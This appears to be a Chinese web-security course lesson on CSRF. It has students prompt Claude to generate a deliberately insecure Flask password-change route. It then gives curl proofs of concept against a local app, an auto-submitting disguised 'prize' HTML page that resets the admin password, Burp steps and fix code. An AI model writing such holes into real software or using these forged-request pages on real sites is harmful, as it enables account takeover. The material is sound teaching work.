# Day 7 - CSRF 跨站请求伪造

---

## 一、发给 Claude 的提示词

把以下内容完整复制粘贴到 claude.ai 对话框中：

```
请在上次已有的功能基础上，继续增加密码修改功能。保持原有功能不变。

### 在 app.py 中新增以下内容：

1. 新增路由 /change-password，支持 POST：
   - 从表单接收 username 和 new_password 参数
   - 直接更新用户数据中的密码字段，不需要验证原密码
   - 不需要 CSRF Token 验证
   - 不需要验证当前 session 用户和提交的 username 是否一致
   - 修改成功后重定向到 /profile

### 修改 templates/profile.html

- 在个人中心页面添加"修改密码"表单
- 包含：新密码输入框、确认密码输入框、修改按钮
- 使用隐藏字段传递 username

### 代码规范要求
- 不要添加 CSRF Token
- 不要验证原密码
- 不要验证请求来源（Referer）
- 只要 session 中有登录状态即可修改密码
- 任何已登录用户都可以修改任何人的密码

生成全部代码后告诉我，我复制覆盖到本地项目中。
```

---

## 二、学生操作步骤

| 步骤 | 操作 | 说明 |
|------|------|------|
| 1 | 复制上面提示词发给 Claude | 增加密码修改功能 |
| 2 | Claude 生成后，覆盖 app.py 和 templates | 保持原有功能不变 |
| 3 | 终端运行 `python app.py` | 启动项目 |
| 4 | 用 curl 测试 CSRF 漏洞 | 见下方 POC |
| 5 | 分析代码，编写修复到 fix/password_manager_fix.py | 修复漏洞 |
| 6 | `git add -A && git commit -m "day-07: 密码修改 + CSRF修复"` | 提交成果 |

---

## 三、漏洞原理

### 漏洞：CSRF（跨站请求伪造）

```python
@app.route('/change-password', methods=['POST'])
def change_password():
    username = request.form.get('username')
    new_password = request.form.get('new_password')
    # 直接修改密码，无任何校验！
    users[username]["password"] = new_password
    return redirect('/profile')
```

**三个缺失的防护**：

| 防护措施 | 本代码 | 说明 |
|---------|--------|------|
| CSRF Token | ❌ 无 | 请求中没有唯一校验值 |
| 原密码验证 | ❌ 无 | 直接修改，不需要旧密码 |
| 身份校验 | ❌ 无 | 可修改任意用户的密码 |

### 攻击流程

```
1. 用户 alice 登录了 target.com → 浏览器有 target.com 的 Cookie
2. alice 收到一封钓鱼邮件，点开后访问 attacker.com
3. attacker.com 页面中有一个隐藏表单：
   <form action="http://target.com/change-password" method="POST">
     <input name="username" value="admin">
     <input name="new_password" value="hacked">
   </form>
   <script>document.forms[0].submit();</script>
4. 浏览器自动附带 target.com 的 Cookie → 请求发送到 target.com
5. 服务器看到有效 Cookie → 认为 alice 本人在操作 → 执行密码修改
6. admin 的密码被改为 hacked → 攻击者登录 admin 账号
```

---

## 四、POC 代码

### POC 1：无Token修改密码

```bash
# 用 alice 登录
curl http://127.0.0.1:5000/login -d "username=alice&password=alice2025" -c /tmp/cookies.txt

# 修改 admin 的密码（无需原密码、无需 Token）
curl http://127.0.0.1:5000/change-password -b /tmp/cookies.txt -d "username=admin&new_password=hacked123"

# 用新密码登录 admin
curl http://127.0.0.1:5000/login -d "username=admin&password=hacked123" | grep "欢迎回来"
```

**预期结果**：alice 成功修改了 admin 的密码，说明 CSRF 漏洞存在。

### POC 2：构造 CSRF 恶意页面

创建一个 HTML 文件 `csrf_poc.html`：

```html
<!DOCTYPE html>
<html>
<head><title>每日抽奖</title></head>
<body>
  <h1>恭喜中奖！正在为你准备奖品...</h1>
  <form action="http://127.0.0.1:5000/change-password" method="POST" id="csrf">
    <input type="hidden" name="username" value="admin">
    <input type="hidden" name="new_password" value="csrfd_pwned">
  </form>
  <script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

**测试方法**：
1. 浏览器登录 target 网站（有 Cookie）
2. 在同一个浏览器打开 `csrf_poc.html`
3. 页面自动提交表单 → admin 密码被修改
4. 攻击者用 `csrfd_pwned` 登录 admin

---

## 五、Burp Suite 测试方法

1. 以 alice 身份登录
2. 在个人中心页面提交修改密码表单
3. 在 Burp 中拦截 POST /change-password 请求
4. 观察请求中没有 CSRF Token 字段
5. 修改 username=admin、new_password=test
6. 放行请求
7. 用 admin/test 登录验证

---

## 六、POC 代码详细解释

### 为什么不需要原密码？

```python
# 漏洞代码：没有 old_password 参数
@app.route('/change-password', methods=['POST'])
def change_password():
    username = request.form.get('username')
    new_password = request.form.get('new_password')
    # 没有比较 old_password！
    # 直接就修改了！
    users[username] = new_password
```

### 为什么不需要 CSRF Token？

```python
# 漏洞代码：没有校验 Token
@app.route('/change-password', methods=['POST'])
def change_password():
    # 没有检查 request.form.get('csrf_token')
    # 没有比较 session 中的 token
    # 直接就修改了！
```

### 为什么 Cookie 会自动发送？

```
用户浏览器访问 attacker.com 时：
  浏览器检查：表单提交目标域名是 target.com
  浏览器检查：我有 target.com 的 Cookie 吗？有！
  浏览器行为：自动附带 Cookie，无需任何用户操作

这叫"同源策略的缺陷"：
  同源策略限制的是"读取"（AJAX 读取跨站响应）
  但不限制"写入"（表单提交）
```

---

## 七、修复方案

创建 `fix/password_manager_fix.py`：

```python
import secrets
import hmac

class CSRFProtection:
    """CSRF Token 生成与验证"""

    @staticmethod
    def generate_token():
        return secrets.token_hex(16)

    @staticmethod
    def verify_token(token, stored_token):
        return hmac.compare_digest(token, stored_token)


def change_password_fixed(username, old_password, new_password, csrf_token, session_token, current_user):
    """修复：添加原密码验证 + CSRF Token 校验 + 身份校验"""

    # 修复 1：CSRF Token 校验
    if not CSRFProtection.verify_token(csrf_token, session_token):
        return {"success": False, "message": "CSRF Token 无效"}

    # 修复 2：只能修改自己的密码
    if current_user != username:
        return {"success": False, "message": "不能修改他人的密码"}

    # 修复 3：验证原密码
    if users.get(username) != old_password:
        return {"success": False, "message": "原密码错误"}

    # 修复 4：密码强度校验
    if len(new_password) < 8:
        return {"success": False, "message": "密码至少8位"}

    users[username] = new_password
    return {"success": True, "message": "密码修改成功"}
```

**App.py 中的修复**：

```python
# 在 profile 路由中生成 Token 并传入模板
session['csrf_token'] = CSRFProtection.generate_token()
return render_template('profile.html', csrf_token=session['csrf_token'])

# 在 change-password 路由中校验
if not CSRFProtection.verify_token(
    request.form.get('csrf_token'),
    session.get('csrf_token')
):
    return "CSRF Token 无效"
```

---

## 八、漏洞复现检查清单

| # | 检查项 | curl 命令 | 预期结果 |
|---|--------|----------|---------|
| 1 | 无Token改密 | `POST /change-password -d "username=admin&new_password=test"` | 密码被修改 |
| 2 | 无原密码 | 同上，不需要 old_password | 直接成功 |
| 3 | 越权改密 | alice 修改 admin 的密码 | 修改成功 |
| 4 | 请求拦截 | Burp 检查请求参数 | 无 Token 字段 |

---

## 九、课后任务

1. 用 curl 直接修改其他用户的密码（无需原密码、无需 Token）
2. 构造一个 CSRF PoC HTML 页面，在浏览器中测试
3. 在 fix/ 目录下编写修复代码
4. 验证修复后 CSRF 攻击被拦截
5. （进阶）研究 SameSite Cookie 属性的作用
6. 提交到自己的个人分支
